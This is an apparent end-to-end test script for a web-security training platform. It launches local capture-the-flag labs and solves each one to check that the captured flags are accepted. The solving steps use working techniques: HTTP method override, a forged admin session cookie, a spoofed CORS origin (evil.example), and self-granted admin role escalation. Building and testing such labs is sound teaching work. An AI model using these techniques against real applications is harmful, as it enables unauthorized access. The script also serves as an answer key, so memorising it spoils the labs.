#!/usr/bin/env bash
# Blackbox: Wave 1 curriculum end-to-end. Launch → exploit → submit real flags.
# Usage: ./scripts/blackbox/bb-curriculum.sh [base_url]
# Requires: stack up + lab images built (./scripts/build-lab-images.sh).
set -u
BASE="${1:-http://localhost:8000}"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); echo "PASS: $1"; }
bad() { FAIL=$((FAIL+1)); echo "FAIL: $1${2:+ — $2}"; }
J() { python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }

echo "== curriculum blackbox @ $BASE =="
T=$(curl -s -X POST "$BASE/v1/auth/login" -H 'Content-Type: application/json' -d '{"email":"learner@lab.dev"}' | J "d['token']") || T=""
launch() { curl -s -X POST "$BASE/v1/sessions" -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"lab\":\"$1@0.1.0\"}"; }
submit() { curl -s -X POST "$BASE/v1/sessions/$2/submissions" -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"objective_id\":\"$1\",\"flag\":\"$3\"}"; }
destroy() { curl -s -X DELETE "$BASE/v1/sessions/$1" -H "Authorization: Bearer $T" > /dev/null; }

L=$(launch web-http-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "http launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  curl -s "http://127.0.0.1:$P/note?text=HACKED" -H "X-HTTP-Method-Override: POST" > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/flag" | J "d.get('flag','')")
  submit override-note "$S" "$F" | grep -q '"correct":true' && ok "http override → flag accepted" || bad "http solve" "$F"
  destroy "$S"
fi

L=$(launch web-cookies-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "cookies launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  A=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'admin'}).encode()).decode())")
  F=$(curl -s "http://127.0.0.1:$P/admin" -H "Cookie: session=$A" | J "d.get('flag','')")
  submit become-admin "$S" "$F" | grep -q '"correct":true' && ok "cookie forge → flag accepted" || bad "cookies solve" "$F"
  destroy "$S"
fi

L=$(launch web-headers-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "headers launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  F=$(curl -s "http://127.0.0.1:$P/cors/flag" -H "Origin: https://evil.example" -H "Cookie: session=x" | J "d.get('flag','')")
  submit cors-steal "$S" "$F" | grep -q '"correct":true' && ok "CORS steal → flag accepted" || bad "headers solve" "$F"
  destroy "$S"
fi

L=$(launch web-authz-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "authz launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
  curl -s -X POST "http://127.0.0.1:$P/api/users/user/role" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"role":"admin"}' > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
  submit escalate-role "$S" "$F" | grep -q '"correct":true' && ok "self-promote → flag accepted" || bad "authz solve" "$F"
  destroy "$S"
fi

L=$(launch web-report-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "report launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  [ "$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://127.0.0.1:$P/findings" -H 'Content-Type: application/json' -d '{"description":"x"}')" = "422" ] && ok "thin finding rejected" || bad "thin finding"
  FULL=$(python3 -c "import json;print(json.dumps({k:f'substantive {k} content here' for k in ['description','evidence','impact','cwe','remediation','retest']}))")
  F=$(curl -s -X POST "http://127.0.0.1:$P/findings" -H 'Content-Type: application/json' -d "$FULL" | J "d.get('flag','')")
  submit write-finding "$S" "$F" | grep -q '"correct":true' && ok "complete finding → flag accepted" || bad "report solve" "$F"
  destroy "$S"
fi
echo "== $PASS passed, $FAIL failed =="
[ "$FAIL" = "0" ]
